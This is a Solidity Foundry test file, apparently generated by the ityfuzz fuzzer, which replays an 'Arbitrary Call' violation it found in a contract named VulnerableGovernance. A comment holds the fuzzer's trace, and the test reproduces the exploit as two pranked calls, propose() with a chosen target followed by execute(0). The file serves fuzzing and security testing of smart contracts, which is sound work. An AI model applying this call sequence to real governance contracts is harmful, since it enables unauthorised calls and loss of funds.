// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -t '/home/ubuntu/MPSC/contracts/work_dir_multi/build/*' -f
/*

😊😊 Found violations!


================ Description ================
[Arbitrary Call]: Arbitrary call from "/home/ubuntu/MPSC/contracts/work_dir_multi/build/VulnerableGovernance(0x8ae70005049ead36d32e2feb80fc38f996f038ff)" to 0x0374004a00b3990a17ca0e76bc5ca8ca84855756
================ Trace ================
[38;2;211;29;219m[Sender] 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb
   ├─[1] [38;2;240;56;255m0x8ae70005049ead36d32e2FEb80fc38F996F038fF.[38;2;255;123;114mpropose([38;2;133;87;86m0x0374004a00B3990A17ca0E76BC5ca8Ca84855756, 0, 0x002710)
   ├─[1] [38;2;240;56;255m0x8ae70005049ead36d32e2FEb80fc38F996F038fF.[38;2;255;123;114mexecute(0)
   │  │  └─[3] [38;2;133;87;86m0x0374004a00B3990A17ca0E76BC5ca8Ca84855756.[38;2;255;123;114mcall(0x00000000)


 */

contract Build is Test {
    function setUp() public {
    }

    function test() public {
        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        I(0x8ae70005049ead36d32e2FEb80fc38F996F038fF).propose(0x0374004a00B3990A17ca0E76BC5ca8Ca84855756, 0, hex"002710");
        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        I(0x8ae70005049ead36d32e2FEb80fc38F996F038fF).execute(0);
    }

    // Stepping with return
    receive() external payable {}
}

interface I {
    function propose(address,uint256,bytes memory) external payable;
    function execute(uint256) external payable;
}
